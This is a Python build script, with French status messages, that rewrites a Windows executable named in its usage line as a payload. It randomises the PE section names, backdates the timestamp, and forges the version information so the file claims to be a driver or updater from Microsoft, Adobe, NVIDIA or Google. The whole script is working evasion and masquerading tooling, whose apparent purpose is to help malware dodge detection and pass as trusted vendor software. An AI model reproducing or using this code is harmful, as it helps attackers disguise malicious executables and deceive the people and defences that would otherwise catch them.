# build/edit_pe.py

import pefile
import sys
import random
import time
import os

def random_string(length=6):
    return ''.join(random.choices("ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz", k=length))

def modify_pe_headers(pe):
    print("[*] Modification des sections...")
    for section in pe.sections:
        section.Name = (random_string(5) + '\x00' * 3).encode('utf-8')

    print("[*] Modification du timestamp...")
    pe.FILE_HEADER.TimeDateStamp = int(time.time()) - random.randint(100000, 500000)

    return pe

def modify_version_info(pe, filepath):
    print("[*] Modification des informations version...")
    for fileinfo in pe.FileInfo:
        for entry in fileinfo:
            if hasattr(entry, 'StringTable'):
                for st in entry.StringTable:
                    st.entries['CompanyName'] = random.choice(['Microsoft', 'Adobe', 'NVIDIA', 'Google'])
                    st.entries['FileDescription'] = random.choice(['Audio Manager', 'Driver Helper', 'System Updater'])
                    st.entries['FileVersion'] = f"{random.randint(1, 9)}.{random.randint(0, 9)}.{random.randint(0, 999)}"
                    st.entries['InternalName'] = os.path.basename(filepath)
                    st.entries['ProductName'] = random.choice(['Windows Driver Manager', 'System Component', 'Runtime Engine'])
                    st.entries['ProductVersion'] = "1.0"

def patch_pe_file(filepath):
    print(f"[+] Chargement de {filepath}")
    pe = pefile.PE(filepath)

    pe = modify_pe_headers(pe)

    try:
        modify_version_info(pe, filepath)
    except Exception as e:
        print(f"[!] Impossible de modifier les infos version : {e}")

    patched_file = filepath.replace(".exe", "_patched.exe")
    pe.write(patched_file)
    pe.close()

    print(f"[✔] Fichier modifié enregistré sous : {patched_file}")

if __name__ == "__main__":
    if len(sys.argv) < 2:
        print("Usage : python edit_pe.py <payload.exe>")
        sys.exit(1)

    filepath = sys.argv[1]
    if not os.path.isfile(filepath):
        print("[❌] Fichier introuvable.")
        sys.exit(1)

    patch_pe_file(filepath)
